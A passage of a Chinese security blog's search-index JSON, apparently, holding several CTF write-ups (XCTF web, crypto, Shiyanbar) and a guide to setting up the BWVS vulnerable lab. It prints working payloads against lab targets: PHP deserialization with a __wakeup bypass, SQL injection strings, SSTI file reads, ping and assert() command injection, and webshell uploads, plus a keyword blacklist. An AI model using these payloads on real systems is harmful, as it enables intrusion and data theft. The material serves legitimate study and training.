&#123; die(&#x27;stop hacking!&#x27;); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo &quot;Missing parameters&quot;; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt; 审计一下代码 preg_match(&quot;/flag/&quot;,$value)我们需要绕过此处对flag的过滤，搜索资料可知parse_url函数存在解析漏洞，如果我们的网址为http://ip/www那么可以正常解析，如果我们输入的是http://ip///www就会返回false从而导致后面的过滤 index.php 有 file 和 payload 两个参数，先 include 了 file 所指向的文件，再经过一系列的检测之后 反序列化 payload。 然后 hint.php 有两个类 Handle 和 Flag。 对于 Handle 类，它的魔术方法 Weakup 会清空其自身的成员变量，将其都置为 null。而其析构函数则会调用自身成员变量 handle 的 getFlag 方法。而 Flag 类就有这个 getFlag 方法了，其中会随机一个 md5(1~10000随机数) 的 flag_token，和自身的 token 做比较，相等就去读文件。看起来我们可以用这里来读 flag.php 文件了。 总结一下有三个需要处理的地方 绕过对flag的过滤 preg_match(“/flag/“,$value) 绕过wakeup() foreach(get_object_vars($this) as $k =&gt; $v) { $this-&gt;$k = null; } 使$this-&gt;token === $this-&gt;token_flag，也就是绕过md5(rand(1,10000)) 绕过preg_match(“/flag/“,$value)，利用parse_url函数存在解析漏洞 绕过wakeup()需要使序列化后串的的属性个数大于实际属性个数 绕过md5(rand(1,10000))，只需要使用一个引用即可， 构造payload： 在hint.php源码下面添加如下代码，然后本地执行： 1234$flag=new Flag(&quot;flag.php&quot;);$flag-&gt;token=&amp;$flag-&gt;token_flag;$handle=new Handle($a);print_r(serialize($handle)); 出现了不可见字符， 只好再url编码一次了，在上面添加 1234$flag=new Flag(&quot;flag.php&quot;);$flag-&gt;token=&amp;$flag-&gt;token_flag;$handle=new Handle($a);print_r(urlencode(serialize($handle))); 此时的payload已经可以绕过反序列化和md5(rand(1,10000))了，但是还需要绕过wakeup()和preg_match(“/flag/“,$value)，首先是上面提到的，更改这个值(代表类中的属性个数)，使这个值大于真实值1即可，这里我们改成2，然后就是利用parse_url函数解析漏洞 payload： ///?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%22f19ec2b84181033bf4753a5a51d5d608%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D flag{d0ed48b8-62be-4656-87fd-f78724183084} 本地phpstudy复现结果， 全宇宙最简单的SQLhttps://www.ctfwp.com/articals/2019national.html","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[]},{"title":"攻防世界xctf之web","slug":"大学CTF/攻防世界xctf之web","date":"2019-04-18T13:06:57.000Z","updated":"2020-12-11T14:40:23.563Z","comments":true,"path":"2019/04/18/大学CTF/攻防世界xctf之web/","link":"","permalink":"http://example.com/2019/04/18/%E5%A4%A7%E5%AD%A6CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cxctf%E4%B9%8Bweb/","excerpt":"前言过来看看。","text":"前言过来看看。 正文新手练习view_source就是看源码啦。 get_postget：`?a=1’ post: `b=21 robotsrobots.txt是一个协议，而不是一个命令。robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。robots.txt文件告诉蜘蛛程序在服务器上什么文件是可以被查看的 打开robots.txt，有一个flag***.php，打开就行。 backup做了之后忘记题是什么了，反正很简单。 cookieF12查看网络参数，发现cookie：cookie.php，访问cookie.php，再次查看header，发现flag。 disable_button有一个按钮，点击之后没有反应，查看源码，发现按钮要实现的功能是post提交一个值auth(好像是这个名字，忘了)，使auth=flag，post提交就可以了。 simple_js一个前端验证，不管输入什么密码，都无法验证成功，看了源码，发现自己看不懂，只能看懂大概，正确的密码应该就是那段十六进制字符串，转成字符之后，变成了数字，应该是ascii码，再转字符，得到一个字符串，我以为这是密码，还需要提交才能得到flag，试了几次都不行，然后直接当做flag提交，就对了。 xff_referer要求IP地址是123.123.123.123，直接bp抓包，在header中添加伪造X-Forwarded-For:123.123.123.123, go之后，要求document.getElementById(&quot;demo&quot;).innerHTML=&quot;必须来自https://www.google.com&quot;; 再在header中添加，referer:https://www.google.com,即可得到flag。 weak_auth随便输入一个用户名和密码，提示必须使用admin登录，用户名改成admin之后，报错是密码错误，然后出现一个check.php，查看源码之后，提示你需要一个字典， 直接bp抓包，然后，load一个密码字典爆破，即可。 webshell直接菜刀连接一下getshell。 command_execution命令执行， ping 1.1.1.1 ping 1.1.1.1&amp;&amp;ls，ls没有执行，&amp;&amp;应该是被过滤了，这里的ping -c 3: 判断操作系统类型，若是windows类型，执行ping ip命令；若是非windows类型，执行ping -c 3 ip 命令 ping 1.1.1.1||ls，ls被执行了，||没有被过滤， ping 1.1.1.1||ls /，可以看到整个目录， 最后在home文件夹找到flag.txt ping 1.1.1.1||cat /home/flag.txt simple_php 直接给出了源码，get提交a和b，要求a=0，并且a不为空，php解析是碰到0e开头串时，会把它当做0， 要求b不是数字，如果b是数字，则exit()，而且要求b&gt;1234，PHP在解析时，遇到类似11xxx的串，只会解析前面的数字，也就是说11xxx=11， 所以payload：a=0e&amp;b=1333x 高手进阶Training-WWW-Robots又是robots，查看robots.txt之后，发现有一个fl0g.php，打开得到flag unserialize3源码 123456class xctf&#123;public $flag = &#x27;111&#x27;;public function __wakeup()&#123;exit(&#x27;bad requests&#x27;);&#125;?code= get提交code，code的值是serialize()序列化后的串， 123456&lt;?phpclass xctf&#123; public $flag=&#x27;111&#x27;;&#125;$a=new xctf();print_r(serialize($a)); 结果是：O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125; 提交之后，后台会进行会序列化，此时就会自动执行__wakeup()函数，然后输出bad request 所以，我们要绕过这个__wakeup()函数，参考文章 在这个序列化后的串中：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;} 里面有个数字 1 ，这个 1 代表的是对象的属性个数，这里只有$flag这一个属性。 而__wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用__wakeup()函数，如果该数字大于真实属性个数，就会绕过__wakeup()函数。 __construct() __实例化对象时被调用。__construct()是构造函数，同时当函数名和类名相同的时候，也是构造函数，构造函数有两种表达方式。 但是当__construct和以类名为函数名的函数同时存在的时候，__construct将被调用，而以类名作为函数名的构造函数不被调用。 所以，payload: `?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;} hacker news 猜测是一道注入题，输入1正常回显，输入1&#39;不能正常回显，应该是单引号闭合， 经测试，有3列 爆库，payload：-1&#39; union select 1,2,database()# 爆表，-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;# 爆列，-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;secret_table&#39;# 爆内容，-1&#39; union select 1,2,fl4g from secret_table# upload先注册一个账户，然后点击login，输入账号密码登录，然后就有上传界面了。 图片的文件名可以造成注入 1selselectect` `frfromom 可以绕过对select,from的过滤 构造payload 查询数据库: 1sql &#x27;+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+&#x27;.jpg 返回: sql 131277325825392 =&gt; web_up 1sql &#x27;+(selselectect CONV(substr(hex(dAtaBase()),13,12),16,10))+&#x27;.jpg 返回: sql 1819238756 =&gt; load 拼接起来得知数据库名为:web_upload 然后查表: 1sql &#x27;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit 1,1)),1,12),16,10))+&#x27;.jpg 返回: sql 114784820031327 =&gt; hello_ 1sql &#x27;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit 1,1)),13,12),16,10))+&#x27;.jpg 返回: sql 112615676665705 =&gt; flag_i 1sql &#x27;+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;web_upload&#x27; limit 1,1)),25,12),16,10))+&#x27;.jpg 返回: sql 126853610566245 =&gt; s_here 拼接起来得知存放flag的表名为: hello_flag_is_here 然后查这个表里有什么字段: 1sql &#x27;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;hello_flag_is_here&#x27; limit 0,1)),1,12),16,10))+&#x27;.jpg 返回: sql 115858377367398 =&gt; i_am_f 1sql &#x27;+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;hello_flag_is_here&#x27; limit 0,1)),13,12),16,10))+&#x27;.jpg 返回: sql 7102823=&gt; lag 拼接起来得知存放flag的字段是:i_am_flag 然后查询flag: 1sql &#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;.jpg 返回: sql 36427215695199 =&gt; !!@m 1sql &#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;.jpg 返回: sql 92806431727430=&gt; Th.e_F 1sql &#x27;+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;.jpg 返回: 1sql 560750951=&gt; !lag 拼起来之后得到flag: !!_@m_Th.e_F!lag Confusion1 首先浏览网站，在导航栏上只有index.php login.php register.php三个页面，打开导航栏上的login.php和register.php，发现是404页面 这个404页面乍一看和普通页面没什么不同，但是查看源码可以发现提示了flag的路径，所以题目意思就是要去读文件 但是login和register功能都没有实现，也就是说没有任何接受用户输入的地方 在index.php页面中有一张图片，图片的内容是一条大蟒蛇缠住了一只大象，很明显这只大象就是PHP的那只吉祥物，大蟒蛇也意味着Python了，所以这到题目应该和Python有关，但是还是不知道哪里可以接受到用户的输入 仔细翻阅网站，可以发现只有两处可被用户控制的地方，就是404页面和403页面中输出url的地方 首先试试这里有没有XSS，在404页面当我们输入XSS的payload时会弹出一个Nope，说明对某些字符进行了过滤，所以很问题明显就出在404页面 既然发现了404页面有问题，但是如果实在想不到SSTI的话那也没办法往下做了 测试5*5，发现404页面输出url的地方却输出了25，于是照着SSTI的思路往下做 后端其实用了Python来模拟PHP 我在黑名单中禁用了一些字符串，就不一一测试了，这里直接给出部分关键黑名单 1` black_list = [ &#x27;write&#x27;, &#x27;class&#x27;, &#x27;mro&#x27;, &#x27;read&#x27;, &#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;|&#x27;, &#x27;join&#x27; &#x27;os&#x27;, &#x27;sys&#x27;, &#x27;pop&#x27;, &#x27;del&#x27;, &#x27;rm&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;ls&#x27;, &#x27;cat&#x27;, &#x27;;&#x27;, &#x27;&amp;&amp;&#x27;, &#x27;catch_warnings&#x27;, &#x27;func_globals&#x27;, &#x27;pickle&#x27;, &#x27;import&#x27;, &#x27;subprocess&#x27;, &#x27;commands&#x27;, &#x27;input&#x27;, &#x27;execfile&#x27;, &#x27;reload&#x27;, &#x27;compile&#x27;, &#x27;execfile&#x27;, &#x27;kill&#x27;, &#x27;func_code&#x27; ] 关键字过滤可以使用request.args绕过 POC: http://xx.xx.xx.xx:xxxx/[request.args.a][request.args.b][2][request.args.c]()[40](&#39;/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt&#39;)[request.args.d]()?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read ics-06一脸懵逼。。。 一顿乱点，终于在报表中心发现了问题 然后，试了几个数字，发现不管输入id等于几都返回一样的界面，问题在哪呢？ 尝试访问一下所有界面，写个脚本爆破一下，发现id=2333时弹出flag 12345678910111213import requestsurl=&quot;http://111.198.29.45:39994/index.php?id=&#123;num&#125;&quot;ses=requests.Session()for i in range(2000,3000,1): payload=url.format(num=i) res=ses.get(payload) print(payload) print(i) if &#x27;cyberpeace&#x27; in res.content: print(res.content) break 这个flag的关键字想不到啊。。。 upload 上传jpg，成功上传，返回了文件的路径 但是文件名变成了1558088360.eee.jpg，bp抓包操作一波 把文件名改成ee.php，成功上传，但是文件名是15556235.eee.php，看来是不管你上传什么，他都在你文件名的前面加一部分，所以，只需要把文件名改成php就可以了 上传成功，是php文件，而且有路径，接下来菜刀连接，找到flag.php，即可得到flag PHP2 上来只有一句话，Can you anthenticate to this website?，尝试了改IP不行之后，扫描一下网站后台，发现index.phps，访问之后，拿到源码 12345678910111213&lt;?phpif(&quot;admin&quot;===$_GET[id]) &#123; echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == &quot;admin&quot;)&#123; echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Key: xxxxxxx &lt;/p&gt;&quot;;&#125;?&gt; id===admin时，输出not allowed urldecode(id)==admin，得到flag 但是当执行if($_GET[id] == “admin”)时，id就会被url解码一次，所以这题考的是url二次编码绕过 payload：?id=%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45(这一串是admin的url二次编码，其实转一个字符就行) mfw拿到题目是一个网站，查看源码 发现一个page=flag，访问之后没啥用 提示信息里提到git，想到**.git**泄露，扫描一下网站 确实存在**.git**泄露，用git下载工具在下载来 但是flag.php的内容是 1234&lt;?php// TODO// $FLAG = &#x27;&#x27;;?&gt; 感觉没什么用啊， 但是查看下载的文件的源码的过程中，发现index.php的源码中有这样的代码 12345678910111213&lt;?phpif (isset($_GET[&#x27;page&#x27;])) &#123; $page = $_GET[&#x27;page&#x27;];&#125; else &#123; $page = &quot;home&quot;;&#125;$file = &quot;templates/&quot; . $page . &quot;.php&quot;;// I heard &#x27;..&#x27; is dangerous!assert(&quot;strpos(&#x27;$file&#x27;, &#x27;..&#x27;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);// TODO: Make this look niceassert(&quot;file_exists(&#x27;$file&#x27;)&quot;) or die(&quot;That file doesn&#x27;t exist!&quot;);?&gt; 这里看到了assert()函数，让我们想到了命令执行，而且page的参数没有进行任何过滤 strpos()是匹配两个字符串的，具体可以百度。 那我们就可以利用assert命令执行来查看flag的内容了payload：?page=1&#39;,&#39;2&#39;) === false and system(&#39;cat templates/flag.php&#39;) and strpos(&#39;templates/flag 拼接后完整的语句是 assert(“strpos(‘templates/1’, ‘2’) === false and system(‘cat templates/flag.php’) and strpos(‘templates/flag.php’) or die(“Detected hacking attempt!”); strpos(‘templates/1’, ‘2’) === false结果为真，and连接**system(‘cat templates/flag.php’)**会执行，然后再执行strpos(‘templates/flag.php’)， 个人理解，不对的话请指正。 Lottery上来先测试了一下，注册用户，购买彩票，拿到足够的钱，购买flag。大概就这样，发现buy.php页面，买完之后还是buy.php，没有页面的跳转，这让我有点搞不懂。 所以扫了一下网站，发现有robots.txt，访问发现 似乎也是Git泄露问题，下载一下试试，拿到很多文件 发现关键代码在api.php里面 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164&lt;?phprequire_once(&#x27;config.php&#x27;);header(&#x27;Content-Type: application/json&#x27;);function response($resp)&#123; die(json_encode($resp));&#125;function response_error($msg)&#123; $result = [&#x27;status&#x27;=&gt;&#x27;error&#x27;]; $result[&#x27;msg&#x27;] = $msg; response($result);&#125;function require_keys($req, $keys)&#123; foreach ($keys as $key) &#123; if(!array_key_exists($key, $req))&#123; response_error(&#x27;invalid request&#x27;); &#125; &#125;&#125;function require_registered()&#123; if(!isset($_SESSION[&#x27;name&#x27;]) || !isset($_SESSION[&#x27;money&#x27;]))&#123; response_error(&#x27;register first&#x27;); &#125;&#125;function require_min_money($min_money)&#123; if(!isset($_SESSION[&#x27;money&#x27;]))&#123; response_error(&#x27;register first&#x27;); &#125; $money = $_SESSION[&#x27;money&#x27;]; if($money &lt; 0)&#123; $_SESSION = array(); session_destroy(); response_error(&#x27;invalid negative money&#x27;); &#125; if($money &lt; $min_money)&#123; response_error(&#x27;you don\\&#x27; have enough money&#x27;); &#125;&#125;if($_SERVER[&quot;REQUEST_METHOD&quot;] != &#x27;POST&#x27; || !isset($_SERVER[&quot;CONTENT_TYPE&quot;]) || $_SERVER[&quot;CONTENT_TYPE&quot;] != &#x27;application/json&#x27;)&#123; response_error(&#x27;please post json data&#x27;);&#125;$data = json_decode(file_get_contents(&#x27;php://input&#x27;), true);if(json_last_error() != JSON_ERROR_NONE)&#123; response_error(&#x27;invalid json&#x27;);&#125;require_keys($data, [&#x27;action&#x27;]);// my boss told me to use cryptographically secure algorithm function random_num()&#123; do &#123; $byte = openssl_random_pseudo_bytes(10, $cstrong); $num = ord($byte); &#125; while ($num &gt;= 250); if(!$cstrong)&#123; response_error(&#x27;server need be checked, tell admin&#x27;); &#125; $num /= 25; return strval(floor($num));&#125;function random_win_nums()&#123; $result = &#x27;&#x27;; for($i=0; $i&lt;7; $i++)&#123; $result .= random_num(); &#125; return $result;&#125;function buy($req)&#123; require_registered(); require_min_money(2); $money = $_SESSION[&#x27;money&#x27;]; $numbers = $req[&#x27;numbers&#x27;]; $win_numbers = random_win_nums(); $same_count = 0; for($i=0; $i&lt;7; $i++)&#123; if($numbers[$i] == $win_numbers[$i])&#123; $same_count++; &#125; &#125; switch ($same_count) &#123; case 2: $prize = 5; break; case 3: $prize = 20; break; case 4: $prize = 300; break; case 5: $prize = 1800; break; case 6: $prize = 200000; break; case 7: $prize = 5000000; break; default: $prize = 0; break; &#125; $money += $prize - 2; $_SESSION[&#x27;money&#x27;] = $money; response([&#x27;status&#x27;=&gt;&#x27;ok&#x27;,&#x27;numbers&#x27;=&gt;$numbers, &#x27;win_numbers&#x27;=&gt;$win_numbers, &#x27;money&#x27;=&gt;$money, &#x27;prize&#x27;=&gt;$prize]);&#125;function flag($req)&#123; global $flag; global $flag_price; require_registered(); $money = $_SESSION[&#x27;money&#x27;]; if($money &lt; $flag_price)&#123; response_error(&#x27;you don\\&#x27; have enough money&#x27;); &#125; else &#123; $money -= $flag_price; $_SESSION[&#x27;money&#x27;] = $money; $msg = &#x27;Here is your flag: &#x27; . $flag; response([&#x27;status&#x27;=&gt;&#x27;ok&#x27;,&#x27;msg&#x27;=&gt;$msg, &#x27;money&#x27;=&gt;$money]); &#125;&#125;function register($req)&#123; $name = $req[&#x27;name&#x27;]; $_SESSION[&#x27;name&#x27;] = $name; $_SESSION[&#x27;money&#x27;] = 20; response([&#x27;status&#x27;=&gt;&#x27;ok&#x27;]);&#125;switch ($data[&#x27;action&#x27;]) &#123; case &#x27;buy&#x27;: require_keys($data, [&#x27;numbers&#x27;]); buy($data); break; case &#x27;flag&#x27;: flag($data); break; case &#x27;register&#x27;: require_keys($data, [&#x27;name&#x27;]); register($data); break; default: response_error(&#x27;invalid request&#x27;); break;&#125; 阅读源码我们发现， requests是json格式的 比较彩票数字与用户数字采用==弱比较 而且是一位一位的比较的 通过以上三点，我们就可以操作一下了， 由于使用的是PHP 弱类型比较，TRUE,1,&quot;1&quot;都相等相等，即true与字符串和数字都是弱相等的。而且，由于 json 支持布尔型数据，那么就可以构造一串数组[true,true,true,true,true,true,true]传入了， bp抓包，然后构造数组，即可得到5000000，再来一次就是10000000，可以购买flag了 FlatScience一通乱点，要么是转到PDF文件，要么是几个页面来回跳转，无奈，， 看看robots.txt，发现有login.php和admin.php，两个登录界面","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"攻防世界xctf-web","slug":"攻防世界xctf-web","permalink":"http://example.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cxctf-web/"}]},{"title":"南邮Crypto","slug":"大学CTF/南邮Crypto","date":"2019-04-14T07:13:26.000Z","updated":"2019-05-09T12:33:00.825Z","comments":true,"path":"2019/04/14/大学CTF/南邮Crypto/","link":"","permalink":"http://example.com/2019/04/14/%E5%A4%A7%E5%AD%A6CTF/%E5%8D%97%E9%82%AECrypto/","excerpt":"前言密码学之旅","text":"前言密码学之旅 正文easy一个简单的base64解密 keyboard 看看键盘，比划一下，发现是areuhack 异性相吸 TIPS:1.xor //异或2.hex2binary //十六进制转二进制3.len(bin(miwen))==len(bin(mingwen)) //二进制密文长度等于二进制明文长度 这是所有的提示信息 脚本, 12345678910111213141516ming=[]with open(&quot;ming.txt&quot;) as f1: for i in f1.read(): ming.append(i)print(ming)mi=[]with open(&quot;mi.txt&quot;) as f2: for i in f2.read(): mi.append(i)print(mi)flag=&#x27;&#x27;for i in range(len(ming)): flag+=chr(ord(ming[i])^ord(mi[i]))print flag Winner Winner Chicken Dinner给了一个加密算法 1234567891011#coding:utf-8from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5import base64flag=raw_input(&#x27;flag:&#x27;)key=RSA.construct((1063045321283844468344531168992778520651192162100948533991539097447031440090068191835838938460807260866872379834796862916118785271062209281267667069640000501698142693389209275376843382863579650119977059768375028586326490055087394631528241983631462471709913758728591459476799115050977493979613545056736162868049L, 837165022918376318972691589160491375229372195625940137121740685432530132860541010174727630660292946071507342455170833392895060048564125597915757582027572284342507277083636059558106672685400173531425920294781499112027917632497954958437660357575400222692979844873372105801998210845285775146263117399191185379347L))cipher = Cipher_pkcs1_v1_5.new(key)cipher_text = base64.b64encode(cipher.encrypt(flag))print cipher_text#cipher_text = &#x27;AGgt1h6dudnkeoCr7SFclkYYsYa65KZ8V29bbgbf+BDyjnyx5stCYjcyktat73aHs2EOaMgwGUwj3HwPTvT+T5LHIxM4uTnAgWOui4dnb7vF7QizN0ShY2O1h26CgLnf5I0vQWbY7WCC7kA/orNW7F5yxZiKRAawacS2M5ghP4/Q&#x27; 这考察了RSA的winner’s attack， 参考文章","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"南邮Crypto","slug":"南邮Crypto","permalink":"http://example.com/tags/%E5%8D%97%E9%82%AECrypto/"}]},{"title":"开头为0e的MD5值","slug":"大学CTF/开头为0e的MD5值","date":"2019-04-13T11:15:44.000Z","updated":"2021-05-23T10:23:13.721Z","comments":true,"path":"2019/04/13/大学CTF/开头为0e的MD5值/","link":"","permalink":"http://example.com/2019/04/13/%E5%A4%A7%E5%AD%A6CTF/%E5%BC%80%E5%A4%B4%E4%B8%BA0e%E7%9A%84MD5%E5%80%BC/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[]},{"title":"BWVS靶场搭建","slug":"靶场/BWVS靶场搭建","date":"2019-04-12T01:57:09.000Z","updated":"2021-05-23T11:01:54.403Z","comments":true,"path":"2019/04/12/靶场/BWVS靶场搭建/","link":"","permalink":"http://example.com/2019/04/12/%E9%9D%B6%E5%9C%BA/BWVS%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/","excerpt":"前言新发现一个靶场(虽然这个靶场很早就有了)，搭建一下，和以往的靶场不同，不是直接把文件夹放到www目录下就行，还需要更改一些设置。","text":"前言新发现一个靶场(虽然这个靶场很早就有了)，搭建一下，和以往的靶场不同，不是直接把文件夹放到www目录下就行，还需要更改一些设置。，这个靶场的开发者虽然给了提示，但是，提示不够啊。 正文下载百度之后，记录一下自己的搭建过程。 首先，靶场的下载地址 百度网盘 密码: i7jd github 目录下载好之后，是一个压缩包。在自己的phpstudy的www目录下，新建一个文件夹BWVS，然后，将压缩包解压到这个文件夹，里面还有一个压缩包WWW，再次解压就可以了，我解压完的目录结构是这样的。 做好这些之后，就是做上面提示的步骤了。 1.导入根目录的sql文件在加压后的文件里，有一个bwvs.sql文件，要把它导入到本地的数据库中，这样会帮你建一个数据库以及一些表。 打开phpstudy，启动MySQL和Apache，点击MySQL管理器–&gt;导入导出，填上你数据库的密码，文件选择dwvs.sql文件，数据库名BWVS，然后导入， 这时，在数据库中，就可以看到导入的数据库了，说明导入成功 2.修改\\bwvs_config\\sys_config.php 配置（mysql和根目录）按照目录找到sys_config.php文件，更改数据库名称 然后，配置根目录的话，直接改成**/BWVS**即可 3.修改\\bug\\conn.php里的mysql配置打开conn.php文件，也是改一个数据库名称。 4.需要开启 allow_url_include = On allow_url_fopen = On这个的话，要看你使用的是PHP的哪个版本了， 在这个PHP的目录下，有很多PHP版本，每个版本里面都有一个php.ini文件 打开这个文件，找到allow_url_include = On allow_url_fopen = On，全部设置称On 这样就可以了。","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[]},{"title":"实验吧--web","slug":"大学CTF/实验吧-web","date":"2019-04-10T11:51:33.000Z","updated":"2019-11-20T09:18:27.370Z","comments":true,"path":"2019/04/10/大学CTF/实验吧-web/","link":"","permalink":"http://example.com/2019/04/10/%E5%A4%A7%E5%AD%A6CTF/%E5%AE%9E%E9%AA%8C%E5%90%A7-web/","excerpt":"前言实验吧的题目还是很好的，来学习一下。","text":"前言实验吧的题目还是很好的，来学习一下。 正文你真的会PHP吗查看源码啥也没有，在header里找到一个hint：6c525af4059b4fe7d8c33a.txt，打开得到源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxx&quot;;ini_set(&quot;display_error&quot;, false); error_reporting(0); if(!isset($_POST[&#x27;number&#x27;]))&#123; header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;); die(&quot;have a fun!!&quot;); &#125;foreach([$_POST] as $global_var) &#123; foreach($global_var as $key =&gt; $value) &#123; $value = trim($value); is_string($value) &amp;&amp; $req[$key] = addslashes($value); &#125; &#125; function is_palindrome_number($number) &#123; $number = strval($number); $i = 0; $j = strlen($number) - 1; while($i &lt; $j) &#123; if($number[$i] !== $number[$j]) &#123; return false; &#125; $i++; $j--; &#125; return true; &#125; if(is_numeric($_REQUEST[&#x27;number&#x27;]))&#123; $info=&quot;sorry, you cann&#x27;t input a number!&quot;;&#125;elseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;])))&#123; $info = &quot;number must be equal to it&#x27;s integer!! &quot;; &#125;else&#123; $value1 = intval($req[&quot;number&quot;]); $value2 = intval(strrev($req[&quot;number&quot;])); if($value1!=$value2)&#123; $info=&quot;no, this is not a palindrome number!&quot;; &#125;else&#123; if(is_palindrome_number($req[&quot;number&quot;]))&#123; $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; &#125;else&#123; $info=$flag; &#125; &#125;&#125;echo $info; 因缺思汀的绕过查看源码，发现source.txt，打开看看 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST[&#x27;uname&#x27;]) || !isset($_POST[&#x27;pwd&#x27;])) &#123; echo &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;.&quot;&lt;br/&gt;&quot;; echo &#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;; echo &#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;.&quot;&lt;br/&gt;&quot;; echo &#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;.&quot;&lt;br/&gt;&quot;; echo &#x27;&lt;/form&gt;&#x27;.&quot;&lt;br/&gt;&quot;; echo &#x27;&lt;!--source: source.txt--&gt;&#x27;.&quot;&lt;br/&gt;&quot;; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); //implode把数组变成字符串拼接起来 &#125; if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123; print &quot;水可载舟，亦可赛艇！&quot;; exit(); &#125;&#125;$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)&quot;;foreach($_POST as 